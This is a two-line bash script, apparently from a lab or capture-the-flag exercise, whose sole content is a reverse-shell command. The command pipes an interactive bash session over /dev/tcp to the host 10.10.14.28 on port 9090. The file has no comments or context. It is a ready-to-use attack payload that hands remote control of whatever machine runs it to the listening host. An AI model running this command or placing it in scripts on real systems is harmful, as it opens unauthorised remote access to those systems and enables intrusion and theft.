#!/bin/bash

bash -c "bash -i >& /dev/tcp/10.10.14.28/9090 0>&1"
